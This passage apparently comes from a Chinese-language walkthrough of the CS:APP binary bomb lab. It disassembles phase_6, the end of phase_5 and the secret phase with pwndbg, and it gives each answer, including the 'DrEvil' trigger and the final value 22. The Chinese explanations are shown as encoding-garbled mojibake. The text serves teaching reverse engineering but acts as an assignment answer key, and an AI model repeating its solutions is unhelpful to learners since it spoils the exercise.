\u0026lt;phase_5+119\u0026gt; 0x00000000004010d2 \u0026lt;+112\u0026gt;: mov eax,0x0 0x00000000004010d7 \u0026lt;+117\u0026gt;: jmp 0x40108b \u0026lt;phase_5+41\u0026gt; 0x00000000004010d9 \u0026lt;+119\u0026gt;: mov rax,QWORD PTR [rsp+0x18] 0x00000000004010de \u0026lt;+124\u0026gt;: xor rax,QWORD PTR fs:0x28 0x00000000004010e7 \u0026lt;+133\u0026gt;: je 0x4010ee \u0026lt;phase_5+140\u0026gt; 0x00000000004010e9 \u0026lt;+135\u0026gt;: call 0x400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x00000000004010ee \u0026lt;+140\u0026gt;: add rsp,0x20 0x00000000004010f2 \u0026lt;+144\u0026gt;: pop rbx 0x00000000004010f3 \u0026lt;+145\u0026gt;: ret å…¶ä¸­ï¼š\n1 2 3 4 pwndbg\u0026gt; x/s 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: \u0026#34;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\u0026#34; pwndbg\u0026gt; x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; å¯çŸ¥æ ¡éªŒé€»è¾‘å¦‚ä¸‹ï¼š\nåˆ¤æ–­è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¸º6 å¾ªç¯6æ¬¡å¦‚ä¸‹æ“ä½œï¼š ä»¥å½“å‰å­—ç¬¦ä¸0xfåš\u0026amp;è¿ç®—ï¼Œch \u0026amp; 0xfå¾—åˆ°çš„ç»“æœä¸ºç´¢å¼•ï¼Œä»å­—ç¬¦ä¸²å¸¸é‡maduiersnfotvbylä¸­å–å‡ºå¯¹åº”å­—ç¬¦ åˆ¤æ–­å–å‡ºçš„6ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºflyers æ•…å¯å¾—ä¸€ä¸ªè§£ä¸ºï¼šionefg\necho \u0026quot;ionefg\u0026quot; \u0026gt;\u0026gt; passcodes\nphase_6 ç‚¹å‡»å±•å¼€phase_6å‡½æ•°çš„å®Œæ•´åæ±‡ç¼– 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 0x00000000004010f4 \u0026lt;+0\u0026gt;: push r14 0x00000000004010f6 \u0026lt;+2\u0026gt;: push r13 0x00000000004010f8 \u0026lt;+4\u0026gt;: push r12 0x00000000004010fa \u0026lt;+6\u0026gt;: push rbp 0x00000000004010fb \u0026lt;+7\u0026gt;: push rbx 0x00000000004010fc \u0026lt;+8\u0026gt;: sub rsp,0x50 0x0000000000401100 \u0026lt;+12\u0026gt;: mov r13,rsp 0x0000000000401103 \u0026lt;+15\u0026gt;: mov rsi,rsp 0x0000000000401106 \u0026lt;+18\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; 0x000000000040110b \u0026lt;+23\u0026gt;: mov r14,rsp 0x000000000040110e \u0026lt;+26\u0026gt;: mov r12d,0x0 0x0000000000401114 \u0026lt;+32\u0026gt;: mov rbp,r13 0x0000000000401117 \u0026lt;+35\u0026gt;: mov eax,DWORD PTR [r13+0x0] 0x000000000040111b \u0026lt;+39\u0026gt;: sub eax,0x1 0x000000000040111e \u0026lt;+42\u0026gt;: cmp eax,0x5 0x0000000000401121 \u0026lt;+45\u0026gt;: jbe 0x401128 \u0026lt;phase_6+52\u0026gt; 0x0000000000401123 \u0026lt;+47\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401128 \u0026lt;+52\u0026gt;: add r12d,0x1 0x000000000040112c \u0026lt;+56\u0026gt;: cmp r12d,0x6 0x0000000000401130 \u0026lt;+60\u0026gt;: je 0x401153 \u0026lt;phase_6+95\u0026gt; 0x0000000000401132 \u0026lt;+62\u0026gt;: mov ebx,r12d 0x0000000000401135 \u0026lt;+65\u0026gt;: movsxd rax,ebx 0x0000000000401138 \u0026lt;+68\u0026gt;: mov eax,DWORD PTR [rsp+rax*4] 0x000000000040113b \u0026lt;+71\u0026gt;: cmp DWORD PTR [rbp+0x0],eax 0x000000000040113e \u0026lt;+74\u0026gt;: jne 0x401145 \u0026lt;phase_6+81\u0026gt; 0x0000000000401140 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401145 \u0026lt;+81\u0026gt;: add ebx,0x1 0x0000000000401148 \u0026lt;+84\u0026gt;: cmp ebx,0x5 0x000000000040114b \u0026lt;+87\u0026gt;: jle 0x401135 \u0026lt;phase_6+65\u0026gt; 0x000000000040114d \u0026lt;+89\u0026gt;: add r13,0x4 0x0000000000401151 \u0026lt;+93\u0026gt;: jmp 0x401114 \u0026lt;phase_6+32\u0026gt; 0x0000000000401153 \u0026lt;+95\u0026gt;: lea rsi,[rsp+0x18] 0x0000000000401158 \u0026lt;+100\u0026gt;: mov rax,r14 0x000000000040115b \u0026lt;+103\u0026gt;: mov ecx,0x7 0x0000000000401160 \u0026lt;+108\u0026gt;: mov edx,ecx 0x0000000000401162 \u0026lt;+110\u0026gt;: sub edx,DWORD PTR [rax] 0x0000000000401164 \u0026lt;+112\u0026gt;: mov DWORD PTR [rax],edx 0x0000000000401166 \u0026lt;+114\u0026gt;: add rax,0x4 0x000000000040116a \u0026lt;+118\u0026gt;: cmp rax,rsi 0x000000000040116d \u0026lt;+121\u0026gt;: jne 0x401160 \u0026lt;phase_6+108\u0026gt; 0x000000000040116f \u0026lt;+123\u0026gt;: mov esi,0x0 0x0000000000401174 \u0026lt;+128\u0026gt;: jmp 0x401197 \u0026lt;phase_6+163\u0026gt; 0x0000000000401176 \u0026lt;+130\u0026gt;: mov rdx,QWORD PTR [rdx+0x8] 0x000000000040117a \u0026lt;+134\u0026gt;: add eax,0x1 0x000000000040117d \u0026lt;+137\u0026gt;: cmp eax,ecx 0x000000000040117f \u0026lt;+139\u0026gt;: jne 0x401176 \u0026lt;phase_6+130\u0026gt; 0x0000000000401181 \u0026lt;+141\u0026gt;: jmp 0x401188 \u0026lt;phase_6+148\u0026gt; 0x0000000000401183 \u0026lt;+143\u0026gt;: mov edx,0x6032d0 0x0000000000401188 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx 0x000000000040118d \u0026lt;+153\u0026gt;: add rsi,0x4 0x0000000000401191 \u0026lt;+157\u0026gt;: cmp rsi,0x18 0x0000000000401195 \u0026lt;+161\u0026gt;: je 0x4011ab \u0026lt;phase_6+183\u0026gt; 0x0000000000401197 \u0026lt;+163\u0026gt;: mov ecx,DWORD PTR [rsp+rsi*1] 0x000000000040119a \u0026lt;+166\u0026gt;: cmp ecx,0x1 0x000000000040119d \u0026lt;+169\u0026gt;: jle 0x401183 \u0026lt;phase_6+143\u0026gt; 0x000000000040119f \u0026lt;+171\u0026gt;: mov eax,0x1 0x00000000004011a4 \u0026lt;+176\u0026gt;: mov edx,0x6032d0 0x00000000004011a9 \u0026lt;+181\u0026gt;: jmp 0x401176 \u0026lt;phase_6+130\u0026gt; 0x00000000004011ab \u0026lt;+183\u0026gt;: mov rbx,QWORD PTR [rsp+0x20] 0x00000000004011b0 \u0026lt;+188\u0026gt;: lea rax,[rsp+0x28] 0x00000000004011b5 \u0026lt;+193\u0026gt;: lea rsi,[rsp+0x50] 0x00000000004011ba \u0026lt;+198\u0026gt;: mov rcx,rbx 0x00000000004011bd \u0026lt;+201\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000004011c0 \u0026lt;+204\u0026gt;: mov QWORD PTR [rcx+0x8],rdx 0x00000000004011c4 \u0026lt;+208\u0026gt;: add rax,0x8 0x00000000004011c8 \u0026lt;+212\u0026gt;: cmp rax,rsi 0x00000000004011cb \u0026lt;+215\u0026gt;: je 0x4011d2 \u0026lt;phase_6+222\u0026gt; 0x00000000004011cd \u0026lt;+217\u0026gt;: mov rcx,rdx 0x00000000004011d0 \u0026lt;+220\u0026gt;: jmp 0x4011bd \u0026lt;phase_6+201\u0026gt; 0x00000000004011d2 \u0026lt;+222\u0026gt;: mov QWORD PTR [rdx+0x8],0x0 0x00000000004011da \u0026lt;+230\u0026gt;: mov ebp,0x5 0x00000000004011df \u0026lt;+235\u0026gt;: mov rax,QWORD PTR [rbx+0x8] 0x00000000004011e3 \u0026lt;+239\u0026gt;: mov eax,DWORD PTR [rax] 0x00000000004011e5 \u0026lt;+241\u0026gt;: cmp DWORD PTR [rbx],eax 0x00000000004011e7 \u0026lt;+243\u0026gt;: jge 0x4011ee \u0026lt;phase_6+250\u0026gt; 0x00000000004011e9 \u0026lt;+245\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004011ee \u0026lt;+250\u0026gt;: mov rbx,QWORD PTR [rbx+0x8] 0x00000000004011f2 \u0026lt;+254\u0026gt;: sub ebp,0x1 0x00000000004011f5 \u0026lt;+257\u0026gt;: jne 0x4011df \u0026lt;phase_6+235\u0026gt; 0x00000000004011f7 \u0026lt;+259\u0026gt;: add rsp,0x50 0x00000000004011fb \u0026lt;+263\u0026gt;: pop rbx 0x00000000004011fc \u0026lt;+264\u0026gt;: pop rbp 0x00000000004011fd \u0026lt;+265\u0026gt;: pop r12 0x00000000004011ff \u0026lt;+267\u0026gt;: pop r13 0x0000000000401201 \u0026lt;+269\u0026gt;: pop r14 0x0000000000401203 \u0026lt;+271\u0026gt;: ret é€»è¾‘è¾ƒé•¿ï¼Œæˆ‘ä»¬åˆ†å—åˆ†æ\né¦–å…ˆæœ‰read_six_numberså‡½æ•°ï¼Œè¯»å…¥6ä¸ªæ•°å­—ï¼š\n1 0x0000000000401106 \u0026lt;+18\u0026gt;: call 0x40145c \u0026lt;read_six_numbers\u0026gt; æ¥ç€æ˜¯ä¸€ä¸ªäºŒå±‚å¾ªç¯ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0x0000000000401114 \u0026lt;+32\u0026gt;: mov rbp,r13 0x0000000000401117 \u0026lt;+35\u0026gt;: mov eax,DWORD PTR [r13+0x0] 0x000000000040111b \u0026lt;+39\u0026gt;: sub eax,0x1 0x000000000040111e \u0026lt;+42\u0026gt;: cmp eax,0x5 0x0000000000401121 \u0026lt;+45\u0026gt;: jbe 0x401128 \u0026lt;phase_6+52\u0026gt; 0x0000000000401123 \u0026lt;+47\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401128 \u0026lt;+52\u0026gt;: add r12d,0x1 0x000000000040112c \u0026lt;+56\u0026gt;: cmp r12d,0x6 0x0000000000401130 \u0026lt;+60\u0026gt;: je 0x401153 \u0026lt;phase_6+95\u0026gt; 0x0000000000401132 \u0026lt;+62\u0026gt;: mov ebx,r12d 0x0000000000401135 \u0026lt;+65\u0026gt;: movsxd rax,ebx 0x0000000000401138 \u0026lt;+68\u0026gt;: mov eax,DWORD PTR [rsp+rax*4] 0x000000000040113b \u0026lt;+71\u0026gt;: cmp DWORD PTR [rbp+0x0],eax 0x000000000040113e \u0026lt;+74\u0026gt;: jne 0x401145 \u0026lt;phase_6+81\u0026gt; 0x0000000000401140 \u0026lt;+76\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401145 \u0026lt;+81\u0026gt;: add ebx,0x1 0x0000000000401148 \u0026lt;+84\u0026gt;: cmp ebx,0x5 0x000000000040114b \u0026lt;+87\u0026gt;: jle 0x401135 \u0026lt;phase_6+65\u0026gt; 0x000000000040114d \u0026lt;+89\u0026gt;: add r13,0x4 0x0000000000401151 \u0026lt;+93\u0026gt;: jmp 0x401114 \u0026lt;phase_6+32\u0026gt; å¯¹åº”çš„åŠŸèƒ½ä¸ºæ£€æµ‹ï¼š\nè¾“å…¥çš„æ•°å­—å¤§å°åœ¨[1,6]ä¸­ 6ä¸ªæ•°å­—æ— é‡å¤ æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªä¸€å±‚å¾ªç¯ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 0x0000000000401153 \u0026lt;+95\u0026gt;: lea rsi,[rsp+0x18] 0x0000000000401158 \u0026lt;+100\u0026gt;: mov rax,r14 0x000000000040115b \u0026lt;+103\u0026gt;: mov ecx,0x7 0x0000000000401160 \u0026lt;+108\u0026gt;: mov edx,ecx 0x0000000000401162 \u0026lt;+110\u0026gt;: sub edx,DWORD PTR [rax] 0x0000000000401164 \u0026lt;+112\u0026gt;: mov DWORD PTR [rax],edx 0x0000000000401166 \u0026lt;+114\u0026gt;: add rax,0x4 0x000000000040116a \u0026lt;+118\u0026gt;: cmp rax,rsi 0x000000000040116d \u0026lt;+121\u0026gt;: jne 0x401160 \u0026lt;phase_6+108\u0026gt; ç”¨äºå®ç°ï¼šinput_numbers[i] = 7 - input_numbers[i]\næ¥ä¸‹æ¥åˆæ˜¯ä¸€ä¸ªå¾ªç¯ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 0x000000000040116f \u0026lt;+123\u0026gt;: mov esi,0x0 0x0000000000401174 \u0026lt;+128\u0026gt;: jmp 0x401197 \u0026lt;phase_6+163\u0026gt; 0x0000000000401176 \u0026lt;+130\u0026gt;: mov rdx,QWORD PTR [rdx+0x8] 0x000000000040117a \u0026lt;+134\u0026gt;: add eax,0x1 0x000000000040117d \u0026lt;+137\u0026gt;: cmp eax,ecx 0x000000000040117f \u0026lt;+139\u0026gt;: jne 0x401176 \u0026lt;phase_6+130\u0026gt; 0x0000000000401181 \u0026lt;+141\u0026gt;: jmp 0x401188 \u0026lt;phase_6+148\u0026gt; 0x0000000000401183 \u0026lt;+143\u0026gt;: mov edx,0x6032d0 0x0000000000401188 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+rsi*2+0x20],rdx 0x000000000040118d \u0026lt;+153\u0026gt;: add rsi,0x4 0x0000000000401191 \u0026lt;+157\u0026gt;: cmp rsi,0x18 0x0000000000401195 \u0026lt;+161\u0026gt;: je 0x4011ab \u0026lt;phase_6+183\u0026gt; 0x0000000000401197 \u0026lt;+163\u0026gt;: mov ecx,DWORD PTR [rsp+rsi*1] 0x000000000040119a \u0026lt;+166\u0026gt;: cmp ecx,0x1 0x000000000040119d \u0026lt;+169\u0026gt;: jle 0x401183 \u0026lt;phase_6+143\u0026gt; 0x000000000040119f \u0026lt;+171\u0026gt;: mov eax,0x1 0x00000000004011a4 \u0026lt;+176\u0026gt;: mov edx,0x6032d0 0x00000000004011a9 \u0026lt;+181\u0026gt;: jmp 0x401176 \u0026lt;phase_6+130\u0026gt; 0x6032d0å¤„ä¿å­˜çš„ä¸ºnodeé“¾è¡¨ï¼Œæ•°æ®åŸŸå’ŒæŒ‡é’ˆåŸŸç±»å‹åˆ†åˆ«ä¸ºintå’Œint*ï¼š\n1 2 3 4 5 6 7 pwndbg\u0026gt; x/12 0x6032d0 0x6032d0 \u0026lt;node1\u0026gt;: 0x000000010000014c 0x00000000006032e0 0x6032e0 \u0026lt;node2\u0026gt;: 0x00000002000000a8 0x00000000006032f0 0x6032f0 \u0026lt;node3\u0026gt;: 0x000000030000039c 0x0000000000603300 0x603300 \u0026lt;node4\u0026gt;: 0x00000004000002b3 0x0000000000603310 0x603310 \u0026lt;node5\u0026gt;: 0x00000005000001dd 0x0000000000603320 0x603320 \u0026lt;node6\u0026gt;: 0x00000006000001bb 0x0000000000000000 è¿™éƒ¨åˆ†æ˜¯å°†ç»è¿‡ä¸Šä¸€æ­¥è®¡ç®—çš„6ä¸ªæ•°ä½œä¸ºç´¢å¼•ï¼Œåˆ†åˆ«å–å‡ºå¯¹åº”nodeçš„æ‰€åœ¨åœ°å€ï¼Œå¹¶å­˜æ”¾äºæ ˆä¸Š\næ¥ç€åˆæ˜¯ä¸€ä¸ªå¾ªç¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 0x00000000004011ab \u0026lt;+183\u0026gt;: mov rbx,QWORD PTR [rsp+0x20] 0x00000000004011b0 \u0026lt;+188\u0026gt;: lea rax,[rsp+0x28] 0x00000000004011b5 \u0026lt;+193\u0026gt;: lea rsi,[rsp+0x50] 0x00000000004011ba \u0026lt;+198\u0026gt;: mov rcx,rbx 0x00000000004011bd \u0026lt;+201\u0026gt;: mov rdx,QWORD PTR [rax] 0x00000000004011c0 \u0026lt;+204\u0026gt;: mov QWORD PTR [rcx+0x8],rdx 0x00000000004011c4 \u0026lt;+208\u0026gt;: add rax,0x8 0x00000000004011c8 \u0026lt;+212\u0026gt;: cmp rax,rsi 0x00000000004011cb \u0026lt;+215\u0026gt;: je 0x4011d2 \u0026lt;phase_6+222\u0026gt; 0x00000000004011cd \u0026lt;+217\u0026gt;: mov rcx,rdx 0x00000000004011d0 \u0026lt;+220\u0026gt;: jmp 0x4011bd \u0026lt;phase_6+201\u0026gt; ç”¨äºå°†0x6032d0å¤„çš„nodeé“¾è¡¨é¡ºåºä¿®æ”¹ä¸ºå’Œä¸Šä¸€æ­¥å¾—åˆ°çš„æ ˆæ•°ç»„ç›¸åŒçš„é¡ºåº\nç„¶åå°±æ˜¯æœ€ç»ˆçš„æ ¡éªŒäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 0x00000000004011d2 \u0026lt;+222\u0026gt;: mov QWORD PTR [rdx+0x8],0x0 0x00000000004011da \u0026lt;+230\u0026gt;: mov ebp,0x5 0x00000000004011df \u0026lt;+235\u0026gt;: mov rax,QWORD PTR [rbx+0x8] 0x00000000004011e3 \u0026lt;+239\u0026gt;: mov eax,DWORD PTR [rax] 0x00000000004011e5 \u0026lt;+241\u0026gt;: cmp DWORD PTR [rbx],eax 0x00000000004011e7 \u0026lt;+243\u0026gt;: jge 0x4011ee \u0026lt;phase_6+250\u0026gt; 0x00000000004011e9 \u0026lt;+245\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x00000000004011ee \u0026lt;+250\u0026gt;: mov rbx,QWORD PTR [rbx+0x8] 0x00000000004011f2 \u0026lt;+254\u0026gt;: sub ebp,0x1 0x00000000004011f5 \u0026lt;+257\u0026gt;: jne 0x4011df \u0026lt;phase_6+235\u0026gt; åˆ¤æ–­ç”±ä¸Šä¸€æ­¥å¾—åˆ°çš„é“¾è¡¨ä¸­çš„æ•°æ®æ˜¯å¦ä¸ºé€çº§é€’å‡çš„\nåŸå§‹é“¾è¡¨æ•°æ®å¤§å°å…³ç³»ä¸ºï¼šnode3 \u0026gt; node4 \u0026gt; node5 \u0026gt; node6 \u0026gt; node1 \u0026gt; node2\næ•…æˆ‘ä»¬éœ€è¦è¾“å…¥ï¼š4 3 2 1 6 5\necho \u0026quot;4 3 2 1 6 5\u0026quot; \u0026gt;\u0026gt; passcodes\nsecret_phase æˆ‘ä»¬æˆåŠŸè§£é™¤äº†ç‚¸å¼¹ï¼Ÿè§‚æµ‹åˆ°bomb.cçš„æœ«å°¾æœ‰ï¼š\n1 2 3 4 5 6 7 8 9 ...... phase_6(input); phase_defused(); /* Wow, they got it! But isn\u0026#39;t something... missing? Perhaps * something they overlooked? Mua ha ha ha ha! */ return 0; } çœ‹èµ·æ¥ä¸å¦™ï¼Œæˆ‘ä»¬åœ¨æ­¤æ‰“æ–­ç‚¹è°ƒè¯•è·Ÿè¿›è¯•è¯•ï¼š gdb -ex \u0026quot;b bomb.c:109\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\nè·Ÿè¿›phase_defusedå‡½æ•°ï¼Œè§‚æµ‹åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 0x4015f0 \u0026lt;phase_defused+44\u0026gt; mov esi, 0x402619 0x4015f5 \u0026lt;phase_defused+49\u0026gt; mov edi, input_strings+240 \u0026lt;0x603870\u0026gt; â–º 0x4015fa \u0026lt;phase_defused+54\u0026gt; call __isoc99_sscanf@plt \u0026lt;__isoc99_sscanf@plt\u0026gt; s: 0x603870 (input_strings+240) â—‚â€” 0x302037 /* \u0026#39;7 0\u0026#39; */ format: 0x402619 â—‚â€” \u0026#39;%d %d %s\u0026#39; vararg: 0x7fffffffe038 â—‚â€” 0x600000005 0x4015ff \u0026lt;phase_defused+59\u0026gt; cmp eax, 3 0x401602 \u0026lt;phase_defused+62\u0026gt; jne phase_defused+113 \u0026lt;phase_defused+113\u0026gt; 0x401604 \u0026lt;phase_defused+64\u0026gt; mov esi, 0x402622 0x401609 \u0026lt;phase_defused+69\u0026gt; lea rdi, [rsp + 0x10] 0x40160e \u0026lt;phase_defused+74\u0026gt; call strings_not_equal \u0026lt;strings_not_equal\u0026gt; å…¶ä¸­ï¼š\n1 2 3 4 pwndbg\u0026gt; x/s 0x402619 0x402619: \u0026#34;%d %d %s\u0026#34; pwndbg\u0026gt; x/s 0x603870 0x603870 \u0026lt;input_strings+240\u0026gt;: \u0026#34;7 0\u0026#34; çœ‹æ¥è¿™åœ¨è¯»å–ç¬¬å››å…³çš„ä¸¤ä¸ªæ•°å­—æ—¶ï¼Œè¿˜è¯•å›¾åœ¨åé¢è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚é˜…è¯»åæ±‡ç¼–åå‘ç°ï¼Œæ˜¯ç”¨äºåœ¨ä¸‹æ–¹strings_not_equalå‡½æ•°ä¸­ä¸0x402622å¤„çš„å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼š\n1 2 pwndbg\u0026gt; x/s 0x402622 0x402622: \u0026#34;DrEvil\u0026#34; æ‰€ä»¥æˆ‘ä»¬åœ¨ç¬¬å››å…³çš„è¾“å…¥åè¿½åŠ å­—ç¬¦ä¸²DrEvilï¼Œå³å¯è¿›å…¥éšè—å…³å¡ï¼šgdb -ex \u0026quot;b secret_phase\u0026quot; -ex \u0026quot;r\u0026quot; --args bomb passcodes\nsecret_phaseå‡½æ•°åæ±‡ç¼–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 0x0000000000401242 \u0026lt;+0\u0026gt;: push rbx 0x0000000000401243 \u0026lt;+1\u0026gt;: call 0x40149e \u0026lt;read_line\u0026gt; 0x0000000000401248 \u0026lt;+6\u0026gt;: mov edx,0xa 0x000000000040124d \u0026lt;+11\u0026gt;: mov esi,0x0 0x0000000000401252 \u0026lt;+16\u0026gt;: mov rdi,rax 0x0000000000401255 \u0026lt;+19\u0026gt;: call 0x400bd0 \u0026lt;strtol@plt\u0026gt; 0x000000000040125a \u0026lt;+24\u0026gt;: mov rbx,rax 0x000000000040125d \u0026lt;+27\u0026gt;: lea eax,[rax-0x1] 0x0000000000401260 \u0026lt;+30\u0026gt;: cmp eax,0x3e8 0x0000000000401265 \u0026lt;+35\u0026gt;: jbe 0x40126c \u0026lt;secret_phase+42\u0026gt; 0x0000000000401267 \u0026lt;+37\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x000000000040126c \u0026lt;+42\u0026gt;: mov esi,ebx 0x000000000040126e \u0026lt;+44\u0026gt;: mov edi,0x6030f0 0x0000000000401273 \u0026lt;+49\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x0000000000401278 \u0026lt;+54\u0026gt;: cmp eax,0x2 0x000000000040127b \u0026lt;+57\u0026gt;: je 0x401282 \u0026lt;secret_phase+64\u0026gt; 0x000000000040127d \u0026lt;+59\u0026gt;: call 0x40143a \u0026lt;explode_bomb\u0026gt; 0x0000000000401282 \u0026lt;+64\u0026gt;: mov edi,0x402438 0x0000000000401287 \u0026lt;+69\u0026gt;: call 0x400b10 \u0026lt;puts@plt\u0026gt; 0x000000000040128c \u0026lt;+74\u0026gt;: call 0x4015c4 \u0026lt;phase_defused\u0026gt; 0x0000000000401291 \u0026lt;+79\u0026gt;: pop rbx 0x0000000000401292 \u0026lt;+80\u0026gt;: ret å…¶æµç¨‹ä¸ºï¼š\nè¯»å–ä¸€ä¸ªç”¨æˆ·è¾“å…¥çš„æ•°å­— åˆ¤æ–­è¾“å…¥æ•°å­—æ˜¯å¦æ»¡è¶³ï¼šinput_number - 1 \u0026lt;= 1000 åˆ¤æ–­æ˜¯å¦æ»¡è¶³ï¼šfun7(\u0026amp;n1, input_number) == 2 fun7åæ±‡ç¼–å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 0x0000000000401204 \u0026lt;+0\u0026gt;: sub rsp,0x8 0x0000000000401208 \u0026lt;+4\u0026gt;: test rdi,rdi 0x000000000040120b \u0026lt;+7\u0026gt;: je 0x401238 \u0026lt;fun7+52\u0026gt; 0x000000000040120d \u0026lt;+9\u0026gt;: mov edx,DWORD PTR [rdi] 0x000000000040120f \u0026lt;+11\u0026gt;: cmp edx,esi 0x0000000000401211 \u0026lt;+13\u0026gt;: jle 0x401220 \u0026lt;fun7+28\u0026gt; 0x0000000000401213 \u0026lt;+15\u0026gt;: mov rdi,QWORD PTR [rdi+0x8] 0x0000000000401217 \u0026lt;+19\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x000000000040121c \u0026lt;+24\u0026gt;: add eax,eax 0x000000000040121e \u0026lt;+26\u0026gt;: jmp 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401220 \u0026lt;+28\u0026gt;: mov eax,0x0 0x0000000000401225 \u0026lt;+33\u0026gt;: cmp edx,esi 0x0000000000401227 \u0026lt;+35\u0026gt;: je 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401229 \u0026lt;+37\u0026gt;: mov rdi,QWORD PTR [rdi+0x10] 0x000000000040122d \u0026lt;+41\u0026gt;: call 0x401204 \u0026lt;fun7\u0026gt; 0x0000000000401232 \u0026lt;+46\u0026gt;: lea eax,[rax+rax*1+0x1] 0x0000000000401236 \u0026lt;+50\u0026gt;: jmp 0x40123d \u0026lt;fun7+57\u0026gt; 0x0000000000401238 \u0026lt;+52\u0026gt;: mov eax,0xffffffff 0x000000000040123d \u0026lt;+57\u0026gt;: add rsp,0x8 0x0000000000401241 \u0026lt;+61\u0026gt;: ret n1ä¸ºä¸€ä¸ªæ ‘ç»“ç‚¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 pwndbg\u0026gt; x/60 \u0026amp;n1 0x6030f0 \u0026lt;n1\u0026gt;: 0x0000000000000024 0x0000000000603110 0x603100 \u0026lt;n1+16\u0026gt;: 0x0000000000603130 0x0000000000000000 0x603110 \u0026lt;n21\u0026gt;: 0x0000000000000008 0x0000000000603190 0x603120 \u0026lt;n21+16\u0026gt;: 0x0000000000603150 0x0000000000000000 0x603130 \u0026lt;n22\u0026gt;: 0x0000000000000032 0x0000000000603170 0x603140 \u0026lt;n22+16\u0026gt;: 0x00000000006031b0 0x0000000000000000 0x603150 \u0026lt;n32\u0026gt;: 0x0000000000000016 0x0000000000603270 0x603160 \u0026lt;n32+16\u0026gt;: 0x0000000000603230 0x0000000000000000 0x603170 \u0026lt;n33\u0026gt;: 0x000000000000002d 0x00000000006031d0 0x603180 \u0026lt;n33+16\u0026gt;: 0x0000000000603290 0x0000000000000000 0x603190 \u0026lt;n31\u0026gt;: 0x0000000000000006 0x00000000006031f0 0x6031a0 \u0026lt;n31+16\u0026gt;: 0x0000000000603250 0x0000000000000000 0x6031b0 \u0026lt;n34\u0026gt;: 0x000000000000006b 0x0000000000603210 0x6031c0 \u0026lt;n34+16\u0026gt;: 0x00000000006032b0 0x0000000000000000 0x6031d0 \u0026lt;n45\u0026gt;: 0x0000000000000028 0x0000000000000000 0x6031e0 \u0026lt;n45+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x6031f0 \u0026lt;n41\u0026gt;: 0x0000000000000001 0x0000000000000000 0x603200 \u0026lt;n41+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603210 \u0026lt;n47\u0026gt;: 0x0000000000000063 0x0000000000000000 0x603220 \u0026lt;n47+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603230 \u0026lt;n44\u0026gt;: 0x0000000000000023 0x0000000000000000 0x603240 \u0026lt;n44+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603250 \u0026lt;n42\u0026gt;: 0x0000000000000007 0x0000000000000000 0x603260 \u0026lt;n42+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603270 \u0026lt;n43\u0026gt;: 0x0000000000000014 0x0000000000000000 0x603280 \u0026lt;n43+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x603290 \u0026lt;n46\u0026gt;: 0x000000000000002f 0x0000000000000000 0x6032a0 \u0026lt;n46+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x6032b0 \u0026lt;n48\u0026gt;: 0x00000000000003e9 0x0000000000000000 0x6032c0 \u0026lt;n48+16\u0026gt;: 0x0000000000000000 0x0000000000000000 fun7ç¿»è¯‘ä¸ºCè¯­è¨€ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 int fun7(TreeNode* node, int num) { if(node == NULL) return -1; else { if(node-\u0026gt;val \u0026lt;= num) { if(node-\u0026gt;Val == num) return 0; else return 2 * fun7(node-\u0026gt;right, num) + 1; } else return 2 * fun7(node-\u0026gt;left, num); } } æ˜æ˜¾åªæœ‰ä»return 2 * fun7(node-\u0026gt;left, num);æ‰èƒ½è¿”å›2è¿™ä¸ªæ•°å­—\nç”±æ­¤é€†æ¨å¯å¾—ï¼Œæœ€ç»ˆè§£ä¸º22\necho 